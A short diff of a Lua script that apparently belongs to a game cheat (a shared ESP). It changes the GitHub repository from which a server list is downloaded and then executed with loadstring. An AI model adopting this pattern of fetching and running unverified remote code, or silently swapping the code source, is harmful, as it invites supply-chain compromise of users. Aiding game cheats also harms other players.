@@ -334,7 +334,7 @@ local function main()
     local TickRateMultiplier = globals.TickInterval() == 1 / 64 and 1 or 2
     local LastTick = globals.TickCount()
 
-    http.Get("https://raw.githubusercontent.com/stqcky/SharedESP/main/ServerList.lua", function(Result)
+    http.Get("https://raw.githubusercontent.com/razor50333/ESP/main/ServerList.lua", function(Result)
         Network.ServerList = loadstring(Result)()
         local ServerNames = {}
 
